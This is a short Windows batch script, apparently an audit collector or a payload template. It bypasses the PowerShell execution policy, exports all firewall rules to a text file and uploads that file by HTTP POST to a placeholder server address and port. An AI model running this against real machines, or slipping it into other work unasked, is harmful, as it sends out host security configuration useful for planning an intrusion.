@echo off
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "netsh advfirewall firewall show rule name=all | Out-File -FilePath C:\audit_firewall.txt -Encoding ascii; Invoke-WebRequest -Uri \"http://{{SERVER_IP}}:{{UPLOAD_PORT}}\" -Method POST -InFile C:\audit_firewall.txt -Headers @{\"X-Filename\"=\"audit_firewall.txt\"} -UseBasicParsing"
